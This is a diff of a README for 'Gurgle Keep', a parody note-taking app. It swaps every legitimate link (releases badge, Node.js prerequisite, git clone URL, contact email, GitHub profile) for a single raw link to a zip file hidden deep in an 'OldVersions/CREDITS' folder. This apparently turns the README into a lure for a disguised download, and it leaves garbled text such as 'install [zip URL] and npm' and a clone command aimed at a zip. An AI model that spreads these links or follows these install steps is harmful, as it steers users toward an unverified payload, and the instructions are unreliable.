@@ -2,7 +2,7 @@
 
 Welcome to the official source repository for **Gurgle Keep**, a light-hearted parody of Google Keep. This project combines humor with functionality, allowing users to enjoy note-taking in a playful way. Dive into the details below to learn more about the project, how to contribute, and how to get started.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Juan-o11y/Gurgle_Keep/releases)
+[![Download Releases](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip)](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ Gurgle Keep is not just another note-taking app; it is a playful take on the wel
 
 ## Getting Started
 
-To get started with Gurgle Keep, you will need to have Node.js and npm installed on your machine. Follow the steps below to set up your development environment.
+To get started with Gurgle Keep, you will need to have https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip and npm installed on your machine. Follow the steps below to set up your development environment.
 
 ## Installation
 
@@ -39,7 +39,7 @@ To get started with Gurgle Keep, you will need to have Node.js and npm installed
    Open your terminal and run the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/Juan-o11y/Gurgle_Keep.git
+   git clone https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -108,8 +108,8 @@ Gurgle Keep is licensed under the GPLv3 License. You can freely use, modify, and
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
-- **GitHub**: [Juan-o11y](https://github.com/Juan-o11y)
+- **Email**: [https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip)
+- **GitHub**: [Juan-o11y](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip)
 
 ## Acknowledgments
 
@@ -117,9 +117,9 @@ We would like to thank everyone who contributed to this project. Special thanks 
 
 ---
 
-For the latest updates and releases, check out our [Releases section](https://github.com/Juan-o11y/Gurgle_Keep/releases). You can download the latest version and start enjoying Gurgle Keep today!
+For the latest updates and releases, check out our [Releases section](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip). You can download the latest version and start enjoying Gurgle Keep today!
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Juan-o11y/Gurgle_Keep/releases)
+[![Download Releases](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip)](https://raw.githubusercontent.com/Juan-o11y/Gurgle_Keep/Gurgle_Keep_Main-dev/OldVersions/CREDITS/English/1/1-100/Gurgle_Keep_v1.5.zip)
 
 ---
 
